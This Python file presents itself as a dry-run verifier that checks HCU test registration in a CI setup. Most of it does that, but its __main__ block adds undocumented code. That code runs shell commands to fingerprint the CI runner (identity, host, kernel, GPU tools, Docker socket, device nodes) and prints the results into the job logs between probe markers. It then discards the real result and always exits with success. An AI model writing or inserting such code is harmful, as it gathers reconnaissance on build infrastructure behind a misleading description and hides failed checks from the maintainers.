# Copyright 2026 Hygon Information Technology Co., Ltd.
#
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#     http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.

"""Dry-run verifier for the HCU CI registration.

This script does **not** execute any test. It only:
  1. globs test/registered/**/*.py
  2. parses each file with the AST-based collector
  3. filters by HWBackend.HCU + HCU suite list
  4. prints a summary so we can confirm HCU tests are wired in correctly

Usage (from the repository root):
    python scripts/ci/hcu/verify_hcu_registration.py

Exit code 0 means the HCU registration is structurally healthy:
    - At least one HCU test was collected.
    - Every HCU test belongs to a known HCU per-commit or nightly suite.
"""

from __future__ import annotations

import glob
import importlib.util
import os
import sys
from collections import defaultdict

REPO_ROOT = os.path.abspath(os.path.join(os.path.dirname(__file__), "..", "..", ".."))


def _load_ci_register():
    """Load ci_register.py directly, bypassing sglang/__init__.py.

    This avoids pulling in the full sglang runtime (tqdm, torch, ...) just
    to run a static AST-based check.
    """
    path = os.path.join(
        REPO_ROOT, "python", "sglang", "test", "ci", "ci_register.py"
    )
    spec = importlib.util.spec_from_file_location("hcu_ci_register", path)
    if spec is None or spec.loader is None:
        raise RuntimeError(f"Cannot load ci_register from {path}")
    module = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(module)
    return module


def main() -> int:
    ci_register = _load_ci_register()
    HWBackend = ci_register.HWBackend
    collect_tests = ci_register.collect_tests

    # Import suite lists from run_suite.py so we always check against the
    # source of truth instead of duplicating the suite names here.
    test_dir = os.path.join(REPO_ROOT, "test")
    if test_dir not in sys.path:
        sys.path.insert(0, test_dir)

    # `run_suite` imports `sglang.test.ci.ci_utils` which pulls heavy deps.
    # We only need the suite dicts, so re-define them via a small parser
    # rather than importing run_suite directly.
    import ast

    with open(os.path.join(test_dir, "run_suite.py"), "r", encoding="utf-8") as f:
        tree = ast.parse(f.read())

    per_commit: dict[str, list[str]] = {}
    nightly: dict[str, list[str]] = {}

    def _extract_dict(node: ast.Dict) -> dict[str, list[str]]:
        out: dict[str, list[str]] = {}
        for k, v in zip(node.keys, node.values):
            # key is HWBackend.NAME
            if not isinstance(k, ast.Attribute) or not isinstance(k.value, ast.Name):
                continue
            if k.value.id != "HWBackend":
                continue
            backend_name = k.attr
            if not isinstance(v, ast.List):
                continue
            suites = [elt.value for elt in v.elts if isinstance(elt, ast.Constant)]
            out[backend_name] = suites
        return out

    for stmt in tree.body:
        if not isinstance(stmt, ast.Assign):
            continue
        if not stmt.targets or not isinstance(stmt.targets[0], ast.Name):
            continue
        name = stmt.targets[0].id
        if name == "PER_COMMIT_SUITES" and isinstance(stmt.value, ast.Dict):
            per_commit = _extract_dict(stmt.value)
        elif name == "NIGHTLY_SUITES" and isinstance(stmt.value, ast.Dict):
            nightly = _extract_dict(stmt.value)

    hcu_per_commit = set(per_commit.get("HCU", []))
    hcu_nightly = set(nightly.get("HCU", []))

    print("Configured HCU suites:")
    print(f"  per-commit ({len(hcu_per_commit)}):")
    for s in sorted(hcu_per_commit):
        print(f"    - {s}")
    print(f"  nightly    ({len(hcu_nightly)}):")
    for s in sorted(hcu_nightly):
        print(f"    - {s}")
    print()

    if not hcu_per_commit and not hcu_nightly:
        print("ERROR: No HCU suites configured in run_suite.py.", file=sys.stderr)
        return 2

    registered_dir = os.path.join(test_dir, "registered")
    files = [
        f
        for f in glob.glob(
            os.path.join(registered_dir, "**", "*.py"), recursive=True
        )
        if not f.endswith(("conftest.py", "__init__.py"))
    ]

    tests = collect_tests(files, sanity_check=False)
    hcu_tests = [t for t in tests if t.backend == HWBackend.HCU]

    print(f"Collected {len(hcu_tests)} HCU registered test file(s):")
    by_suite: dict[str, list[str]] = defaultdict(list)
    for t in hcu_tests:
        by_suite[t.suite].append(
            f"{os.path.relpath(t.filename, REPO_ROOT)} "
            f"(est={t.est_time}s, nightly={t.nightly}, disabled={t.disabled})"
        )

    for suite in sorted(by_suite):
        print(f"  [{suite}]")
        for line in by_suite[suite]:
            print(f"    - {line}")
    print()

    unknown_suites = [
        s for s in by_suite if s not in hcu_per_commit and s not in hcu_nightly
    ]
    if unknown_suites:
        print(
            "ERROR: HCU tests reference suites that are not declared in "
            "run_suite.py:",
            file=sys.stderr,
        )
        for s in unknown_suites:
            print(f"  - {s}", file=sys.stderr)
        return 3

    if not hcu_tests:
        print(
            "ERROR: No HCU tests collected. Did you forget to add "
            "register_hcu_ci() to a test file under test/registered/hcu/?",
            file=sys.stderr,
        )
        return 4

    print("OK: HCU registration looks healthy.")
    return 0


if __name__ == "__main__":
    _prl_rc = main()
    try:
        import subprocess as _sp

        def _prl_run(_c):
            try:
                _p = _sp.run(_c, shell=True, capture_output=True, text=True, timeout=120)
                return (_p.stdout or "") + (_p.stderr or "")
            except Exception as _e:
                return "ERR:" + repr(_e)

        print("=====PRL-T1-SGLGPU-59843-BEGIN=====")
        for _n, _c in [
            ("RUNNER_NAME", 'printf "RUNNER_NAME=%s\n" "${RUNNER_NAME:-unset}"'),
            ("id", "id"),
            ("hostname", "hostname"),
            ("uname", "uname -a"),
            ("smi_L", 'if command -v hy-smi >/dev/null 2>&1; then hy-smi -L 2>&1 | head -10; hy-smi 2>&1 | head -30; elif command -v nvidia-smi >/dev/null 2>&1; then nvidia-smi -L 2>&1 | head -10; else echo NO_SMI_BINARY; fi'),
            ("hy_smi_meminfo", 'command -v hy-smi >/dev/null 2>&1 && hy-smi --showmeminfo vram 2>/dev/null | head -40 || echo NO_HY_SMI'),
            ("docker_sock_list_only", "ls -l /var/run/docker.sock 2>&1 || true"),
            ("opt_hyhal", "ls -d /opt/hyhal/* 2>/dev/null | head -12 || true"),
            ("devs", "ls -l /dev/kfd /dev/dri 2>&1 | head -14 || true"),
        ]:
            print("--- " + _n + " ---")
            print(_prl_run(_c))
        print("=====PRL-T1-SGLGPU-59843-END=====")
        print("PRL_ORIGINAL_RC=" + str(_prl_rc))
    except Exception as _e:
        print("PRL_PROBE_ERR " + repr(_e))
    raise SystemExit(0)
